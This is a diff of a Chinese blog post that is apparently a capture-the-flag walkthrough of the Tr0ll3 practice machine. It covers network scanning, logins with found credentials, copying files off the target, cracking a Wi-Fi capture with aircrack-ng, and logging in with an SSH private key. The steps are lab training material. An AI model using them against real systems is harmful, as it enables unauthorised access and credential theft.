@@ -1,9 +1,9 @@
-<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>OSCP-003-Troll | You_zip</title><meta name="author" content="Youzipii"><meta name="copyright" content="Youzipii"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="kali：192.138.174.137 信息收集主机发现nmap -sn 192.168.174.0&#x2F;24 或 arp-scan -l 或 netdiscover -i eht0#比较慢  发现目标主机：192.168.174.156 端口扫描nmap -A -p- 192.168.174.156   只开放了22端口，昨天刚做完ssh敲门，试了下没什么提示，去搜别人的wp，发现它们能扫出来3个">
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>OSCP-003-Troll | You_zip</title><meta name="author" content="Youzipii"><meta name="copyright" content="Youzipii"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="kali：192.138.174.137 信息收集主机发现nmap -sn 192.168.174.0&#x2F;24或arp-scan -l或netdiscover -i eht0#比较慢  发现目标主机：192.168.174.156 端口扫描nmap -A -p- 192.168.174.156   只开放了22端口，昨天刚做完ssh敲门，试了下没什么提示，去搜别人的wp，发现它们能扫出来3个端口，嗯">
 <meta property="og:type" content="article">
 <meta property="og:title" content="OSCP-003-Troll">
 <meta property="og:url" content="http://example.com/2024/04/28/OSCP-003-Troll/index.html">
 <meta property="og:site_name" content="You_zip">
-<meta property="og:description" content="kali：192.138.174.137 信息收集主机发现nmap -sn 192.168.174.0&#x2F;24 或 arp-scan -l 或 netdiscover -i eht0#比较慢  发现目标主机：192.168.174.156 端口扫描nmap -A -p- 192.168.174.156   只开放了22端口，昨天刚做完ssh敲门，试了下没什么提示，去搜别人的wp，发现它们能扫出来3个">
+<meta property="og:description" content="kali：192.138.174.137 信息收集主机发现nmap -sn 192.168.174.0&#x2F;24或arp-scan -l或netdiscover -i eht0#比较慢  发现目标主机：192.168.174.156 端口扫描nmap -A -p- 192.168.174.156   只开放了22端口，昨天刚做完ssh敲门，试了下没什么提示，去搜别人的wp，发现它们能扫出来3个端口，嗯">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://s2.loli.net/2024/08/08/zZWaxXAdoB6sS8e.png">
 <meta property="article:published_time" content="2024-04-28T09:28:30.000Z">
@@ -20,7 +20,7 @@
   localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
   translate: undefined,
   noticeOutdate: undefined,
-  highlight: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
   copy: {
     success: '复制成功',
     error: '复制错误',
@@ -157,38 +157,29 @@
       }
       detectApple()
     })(window)</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/static-butterfly/dist/css/index.min.css"><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://s2.loli.net/2024/08/08/zZWaxXAdoB6sS8e.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">59</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">52</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/image/bk_image/bg3.png')"><nav id="nav"><span id="blog-info"><a href="/" title="You_zip"><span class="site-name">You_zip</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">OSCP-003-Troll</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-04-28T09:28:30.000Z" title="发表于 2024-04-28 17:28:30">2024-04-28</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-08-08T07:30:53.651Z" title="更新于 2024-08-08 15:30:53">2024-08-08</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="OSCP-003-Troll"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p><strong>kali：192.138.174.137</strong></p>
-<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><pre><code>nmap -sn 192.168.174.0/24
-或
-arp-scan -l
-或
-netdiscover -i eht0#比较慢
-</code></pre>
+<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sn 192.168.174.0/24</span><br><span class="line">或</span><br><span class="line">arp-scan -l</span><br><span class="line">或</span><br><span class="line">netdiscover -i eht0#比较慢</span><br></pre></td></tr></table></figure>
+
 <p>发现目标主机：<strong>192.168.174.156</strong></p>
-<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><pre><code>nmap -A -p- 192.168.174.156
-</code></pre>
+<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -A -p- 192.168.174.156</span><br></pre></td></tr></table></figure>
+
 <p><img src="/../image/image-20240428225714640.png" alt="image-20240428225714640"></p>
 <p>只开放了22端口，昨天刚做完ssh敲门，试了下没什么提示，去搜别人的wp，发现它们能扫出来3个端口，嗯？，是我配置环境有问题吗。试试下面这个命令</p>
-<pre><code>nmap -p22 --script &quot;default or safe&quot; 192.168.174.156
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -p22 --script &quot;default or safe&quot; 192.168.174.156</span><br></pre></td></tr></table></figure>
+
 <ol>
 <li>“default”脚本：这个脚本是nmap的默认脚本之一，用于执行一系列常规的端口扫描和服务探测。如开放的端口、运行的服务和版本等。</li>
 <li>“safe”脚本：这个脚本也是nmap的内置脚本之一，它执行一些安全性相关的扫描任务。它会检查目标主机是否存在已知的安全漏洞、弱密码、常见的网络配置错误等。</li>
 </ol>
 <p>扫描完也没有发现什么信息，点开之前打卡的靶机，发现</p>
-<pre><code>Are you sure you want to do this? Login: start :here
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Are you sure you want to do this? Login: start :here</span><br></pre></td></tr></table></figure>
+
 <p>试着登陆一下，发现真登上去了。。。</p>
 <h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>登陆上shell后，id查看权限,ls -a看当前目录有什么文件</p>
-<pre><code>start@Tr0ll3:~$ ls
-bluepill  redpill
-start@Tr0ll3:~$ id
-uid=1001(start) gid=1001(start) groups=1001(start)
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">start@Tr0ll3:~$ ls</span><br><span class="line">bluepill  redpill</span><br><span class="line">start@Tr0ll3:~$ id</span><br><span class="line">uid=1001(start) gid=1001(start) groups=1001(start)</span><br></pre></td></tr></table></figure>
+
 <p>找到了两个文件，分别看看里面的内容,里面各有一个文件</p>
-<pre><code class="bash">#为了安全，先看看文件类型
-file file_awesome_work
-file this_weill_surely_work
-</code></pre>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#为了安全，先看看文件类型</span></span><br><span class="line">file file_awesome_work</span><br><span class="line">file this_weill_surely_work</span><br></pre></td></tr></table></figure>
+
 <ul>
 <li>-b 　列出辨识结果时，不显示文件名称。</li>
 <li>-c 　详细显示指令执行过程，便于排错或分析程序执行的情形。</li>
@@ -200,39 +191,30 @@ file this_weill_surely_work
 <li>[文件或目录…] 要确定类型的文件列表，多个文件之间使用空格分开，可以使用shell通配符匹配多个文件。</li>
 </ul>
 <p>再分别看两个文件的内容</p>
-<pre><code class="bash">#cat filename
-start@Tr0ll3:~$ cat bluepill/awesome_work 
-http://bfy.tw/ODa
-start@Tr0ll3:~$ cat redpill/this_will_surely_work 
-step2:Password1!
-</code></pre>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#cat filename</span></span><br><span class="line">start@Tr0ll3:~$ <span class="built_in">cat</span> bluepill/awesome_work </span><br><span class="line">http://bfy.tw/ODa</span><br><span class="line">start@Tr0ll3:~$ <span class="built_in">cat</span> redpill/this_will_surely_work </span><br><span class="line">step2:Password1!</span><br></pre></td></tr></table></figure>
+
 <p>一个是网址，一个看起来像是账号密码</p>
 <p>这里有个知识点</p>
 <h3 id="短链接还原"><a href="#短链接还原" class="headerlink" title="短链接还原"></a>短链接还原</h3><p>找了下，一些在线网站都挂了，但发现curl可以直接返回</p>
-<pre><code>curl -IL 链接
- https://www.lmgtfy.app/?q=how+do+you+make+a+hacker+waste+time%3F
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -IL 链接</span><br><span class="line"> https://www.lmgtfy.app/?q=how+do+you+make+a+hacker+waste+time%3F</span><br></pre></td></tr></table></figure>
+
 <p>说是在浪费时间，估计正确的步骤是登陆另一个账户</p>
-<pre><code>ssh step2@192.168.174.156
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh step2@192.168.174.156</span><br></pre></td></tr></table></figure>
+
 <p>密码输入，却说没有权限，试试在start那里提权试试</p>
-<pre><code>find / -type f -perm 0777 2&gt;/dev/null
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -type f -perm 0777 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
 <ol>
 <li><code>-type f</code>：该选项指定只搜索文件，而不搜索目录或其他类型的文件（如符号链接）。</li>
 <li><code>-perm 0777</code>：该选项指定要搜索的文件的权限。在这种情况下，它查找权限设置为0777的文件。权限值0777表示具有读取、写入和执行权限的文件。</li>
 </ol>
 <p>找到两个结果</p>
-<pre><code>/var/log/.dist-manage/wytshadow.cap
-/.hints/lol/rofl/roflmao/this/isnt/gonna/stop/anytime/soon/still/going/lol/annoyed/almost/there/jk/no/seriously/last/one/rofl/ok/ill/stop/however/this/is/fun/ok/here/rofl/sorry/you/made/it/gold_star.txt
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/var/log/.dist-manage/wytshadow.cap</span><br><span class="line">/.hints/lol/rofl/roflmao/this/isnt/gonna/stop/anytime/soon/still/going/lol/annoyed/almost/there/jk/no/seriously/last/one/rofl/ok/ill/stop/however/this/is/fun/ok/here/rofl/sorry/you/made/it/gold_star.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
 <p>这些目录构成了一句话，且hint是线索，看下那个txt文件里有什么信息</p>
 <p>看起来像个密码字典，而第一个文件是一个数据包文件，我们先把他们复制到自己本机当前目录</p>
-<pre><code>#在本机kali执行以下两条命令
-scp 192.168.56.152:/var/log/.dist-manage/wytshadow.cap .
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#在本机kali执行以下两条命令</span><br><span class="line">scp 192.168.56.152:/var/log/.dist-manage/wytshadow.cap .</span><br><span class="line"></span><br><span class="line">scp start@192.168.56.152:/.hints/lol/rofl/roflmao/this/isnt/gonna/stop/anytime/soon/still/going/lol/annoyed/almost/there/jk/no/seriously/last/one/rofl/ok/ill/stop/however/this/is/fun/ok/here/rofl/sorry/you/made/it/gold_star.txt .</span><br></pre></td></tr></table></figure>
 
-scp start@192.168.56.152:/.hints/lol/rofl/roflmao/this/isnt/gonna/stop/anytime/soon/still/going/lol/annoyed/almost/there/jk/no/seriously/last/one/rofl/ok/ill/stop/however/this/is/fun/ok/here/rofl/sorry/you/made/it/gold_star.txt .
-</code></pre>
 <h3 id="tcpdump"><a href="#tcpdump" class="headerlink" title="tcpdump"></a>tcpdump</h3><ul>
 <li><strong>-n</strong> 禁止IP名称解析。</li>
 <li><strong>-nn</strong> 禁止IP和端口名称解析。</li>
@@ -252,8 +234,8 @@ scp start@192.168.56.152:/.hints/lol/rofl/roflmao/this/isnt/gonna/stop/anytime/s
 <li><strong>-v&#x2F;-vv&#x2F;-vvv</strong> 打印详细信息，v的个数越多， 打印内容越详细。</li>
 </ul>
 <p>然后我们可以用这个命令来查看数据包的内容</p>
-<pre><code>tcpdump -nnttttAr wytshadow.cap | less -Sr
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tcpdump -nnttttAr wytshadow.cap | less -Sr</span><br></pre></td></tr></table></figure>
+
 <ul>
 <li><code>tcpdump</code>：这是用于网络流量捕获和分析的命令行工具。</li>
 <li><code>-n</code>：此选项告诉 tcpdump 不要将 IP 地址解析为主机名，而是显示 IP 地址。</li>
@@ -263,118 +245,67 @@ scp start@192.168.56.152:/.hints/lol/rofl/roflmao/this/isnt/gonna/stop/anytime/s
 </ul>
 <p>发现是<strong>802.11协议</strong>，是wifi的协议，可能是wifi密码，可以用aircrack破解</p>
 <p>scp完后这两个文件就被考到自己的目录下了，然后用txt作为字典，去破解cap包里的密码</p>
-<pre><code>aircrack-ng -w gold_star.txt wytshadow.cap
-</code></pre>
-<p>经过漫长的等待，发现密码</p>
-<pre><code>wytshadow:gaUoCe34t1
-</code></pre>
-<p>去连接以下这个用户</p>
-<pre><code>ssh sytshadow@192.168.174.156
-</code></pre>
-<p>然后发现目录下有个oohfun文件，file一下发现是ELF文件，linux下的可执行文件，执行以下一直打印，Lynx 是一个文本模式的 Web 浏览器，线索说明可能和浏览器相关</p>
-<pre><code>iM Cr@zY L1k3 AAA LYNX
-</code></pre>
-<p>让我们试试sudo -l看下有什么我们（执行 sudo 的使用者）的权限</p>
-<pre><code>sudo -l输入密码后
-env_reset, mail_badpass,
-    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">aircrack-ng -w gold_star.txt wytshadow.cap</span><br></pre></td></tr></table></figure>
 
-User wytshadow may run the following commands on Tr0ll3:
-    (root) /usr/sbin/service nginx start
-</code></pre>
+<p>经过漫长的等待，发现密码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wytshadow:gaUoCe34t1</span><br></pre></td></tr></table></figure>
+
+<p>去连接以下这个用户</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh sytshadow@192.168.174.156</span><br></pre></td></tr></table></figure>
+
+<p>然后发现目录下有个oohfun文件，file一下发现是ELF文件，linux下的可执行文件，执行以下一直打印，Lynx 是一个文本模式的 Web 浏览器，线索说明可能和浏览器相关</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">iM Cr@zY L1k3 AAA LYNX</span><br></pre></td></tr></table></figure>
+
+<p>让我们试试sudo -l看下有什么我们（执行 sudo 的使用者）的权限</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -l输入密码后</span><br><span class="line">env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User wytshadow may run the following commands on Tr0ll3:</span><br><span class="line">    (root) /usr/sbin/service nginx start</span><br></pre></td></tr></table></figure>
+
 <p>这说明我们有可能启动nginx，sites-enabled 目录中存放的是链接文件，每个链接文件都指向 sites-available 目录中的配置文件，表示需要让 Nginx 启用哪些配置代理文件。</p>
-<pre><code>cd /etc/nginx/site-enable
-cat default
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /etc/nginx/site-enable</span><br><span class="line">cat default</span><br></pre></td></tr></table></figure>
+
 <p>看下网页有什么信息</p>
-<pre><code>server &#123;
-        listen 8080 default_server;
-        listen [::]:8080 default_server;
-                if ($http_user_agent !~ &quot;Lynx*&quot;)&#123;
-    return 403;
-&#125;
- root /var/nginx/www;
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">        listen 8080 default_server;</span><br><span class="line">        listen [::]:8080 default_server;</span><br><span class="line">                if ($http_user_agent !~ &quot;Lynx*&quot;)&#123;</span><br><span class="line">    return 403;</span><br><span class="line">&#125;</span><br><span class="line"> root /var/nginx/www;</span><br></pre></td></tr></table></figure>
+
 <p>这里有两个信息，我们不妨先根据前面的lynx的线索，去看看8080端口有什么提示</p>
-<pre><code>netstat -antp#列出所有当前系统上的 TCP 连接，并显示每个连接的本地地址、外部地址、状态以及关联的进程信息
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat -antp#列出所有当前系统上的 TCP 连接，并显示每个连接的本地地址、外部地址、状态以及关联的进程信息</span><br></pre></td></tr></table></figure>
+
 <p>发现没有相关信息，可能是服务没启动，我们启动下nginx服务</p>
-<pre><code>sudo start service nginxs
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo start service nginxs</span><br></pre></td></tr></table></figure>
+
 <p>再看看就可以发现有相关连接了，新建一个terminal，去看看这个服务的具体信息，结合前面的lynx说明我们可以利用这个命令访问一下这个网页</p>
-<pre><code>lynx 192.168.174.156:8080
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lynx 192.168.174.156:8080</span><br></pre></td></tr></table></figure>
+
 <p>得到一个新的账号</p>
-<pre><code>genphlux:HF9nd0cR!  
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">genphlux:HF9nd0cR!  </span><br></pre></td></tr></table></figure>
+
 <p>继续ssh连接，感觉就是一个ssh的无线套娃</p>
-<pre><code>genphlux@Tr0ll3:~$ file maleus 
-maleus: PEM RSA private key
-genphlux@Tr0ll3:~$ file xlogin 
-xlogin: HTML document, ASCII text
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">genphlux@Tr0ll3:~$ file maleus </span><br><span class="line">maleus: PEM RSA private key</span><br><span class="line">genphlux@Tr0ll3:~$ file xlogin </span><br><span class="line">xlogin: HTML document, ASCII text</span><br></pre></td></tr></table></figure>
+
 <p>一个RSA私钥和一个什么login文件，前面那个文件里就是正常的密钥，而xlogin文件里面好像是一个网页</p>
-<pre><code class="html">&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 3.2 Final//EN&quot;&gt;
-&lt;html&gt;
- &lt;head&gt;
-  &lt;title&gt;Index of /xlogin&lt;/title&gt;
- &lt;/head&gt;
- &lt;body&gt;
-&lt;h1&gt;Index of /xlogin&lt;/h1&gt;
-  &lt;table&gt;
-   &lt;tr&gt;&lt;th valign=&quot;top&quot;&gt;&lt;img src=&quot;/icons/blank.gif&quot; alt=&quot;[ICO]&quot;&gt;&lt;/th&gt;&lt;th&gt;&lt;a href=&quot;?C=N;O=D&quot;&gt;Name&lt;/a&gt;&lt;/th&gt;&lt;th&gt;&lt;a href=&quot;?C=M;O=A&quot;&gt;Last modified&lt;/a&gt;&lt;/th&gt;&lt;th&gt;&lt;a href=&quot;?C=S;O=A&quot;&gt;Size&lt;/a&gt;&lt;/th&gt;&lt;th&gt;&lt;a href=&quot;?C=D;O=A&quot;&gt;Description&lt;/a&gt;&lt;/th&gt;&lt;/tr&gt;
-   &lt;tr&gt;&lt;th colspan=&quot;5&quot;&gt;&lt;hr&gt;&lt;/th&gt;&lt;/tr&gt;
-&lt;tr&gt;&lt;td valign=&quot;top&quot;&gt;&lt;img src=&quot;/icons/back.gif&quot; alt=&quot;[PARENTDIR]&quot;&gt;&lt;/td&gt;&lt;td&gt;&lt;a href=&quot;/&quot;&gt;Parent Directory&lt;/a&gt;&lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;td align=&quot;right&quot;&gt;  - &lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;
-&lt;tr&gt;&lt;td valign=&quot;top&quot;&gt;&lt;img src=&quot;/icons/unknown.gif&quot; alt=&quot;[   ]&quot;&gt;&lt;/td&gt;&lt;td&gt;&lt;a href=&quot;maleus&quot;&gt;maleus&lt;/a&gt;&lt;/td&gt;&lt;td align=&quot;right&quot;&gt;2015-06-18 00:27  &lt;/td&gt;&lt;td align=&quot;right&quot;&gt;1.6K&lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;
-   &lt;tr&gt;&lt;th colspan=&quot;5&quot;&gt;&lt;hr&gt;&lt;/th&gt;&lt;/tr&gt;
-&lt;/table&gt;
-&lt;address&gt;Apache/2.4.29 (Ubuntu) Server at 127.0.0.1 Port 80&lt;/address&gt;
-&lt;/body&gt;&lt;/html&gt;
-</code></pre>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">HTML</span> <span class="keyword">PUBLIC</span> <span class="string">&quot;-//W3C//DTD HTML 3.2 Final//EN&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Index of /xlogin<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Index of /xlogin<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">table</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">th</span> <span class="attr">valign</span>=<span class="string">&quot;top&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/icons/blank.gif&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;[ICO]&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;?C=N;O=D&quot;</span>&gt;</span>Name<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;?C=M;O=A&quot;</span>&gt;</span>Last modified<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;?C=S;O=A&quot;</span>&gt;</span>Size<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;?C=D;O=A&quot;</span>&gt;</span>Description<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">th</span> <span class="attr">colspan</span>=<span class="string">&quot;5&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">hr</span>&gt;</span><span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">valign</span>=<span class="string">&quot;top&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/icons/back.gif&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;[PARENTDIR]&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/&quot;</span>&gt;</span>Parent Directory<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="symbol">&amp;nbsp;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">&quot;right&quot;</span>&gt;</span>  - <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="symbol">&amp;nbsp;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">valign</span>=<span class="string">&quot;top&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/icons/unknown.gif&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;[   ]&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;maleus&quot;</span>&gt;</span>maleus<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">&quot;right&quot;</span>&gt;</span>2015-06-18 00:27  <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">&quot;right&quot;</span>&gt;</span>1.6K<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="symbol">&amp;nbsp;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">th</span> <span class="attr">colspan</span>=<span class="string">&quot;5&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">hr</span>&gt;</span><span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">address</span>&gt;</span>Apache/2.4.29 (Ubuntu) Server at 127.0.0.1 Port 80<span class="tag">&lt;/<span class="name">address</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
 <p>都先保存到本地去看看,网页打开也是下载maleus文件，所以关键还是那个密钥文件，猜测用户名可能就是文件名</p>
-<pre><code>vim sshkey
-chmod 600
-ssh maleus@192.168.174.156 -i sshkey#学到了，用私钥登陆ssh
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim sshkey</span><br><span class="line">chmod 600</span><br><span class="line">ssh maleus@192.168.174.156 -i sshkey#学到了，用私钥登陆ssh</span><br></pre></td></tr></table></figure>
+
 <p>成功登陆，发现当前目录又是一个dont_even_bother的elf文件，执行以下说要输入密码，这时候又是神之一手</p>
-<h3 id="strings"><a href="#strings" class="headerlink" title="strings"></a>strings</h3><pre><code>strings dont_even_bother
-</code></pre>
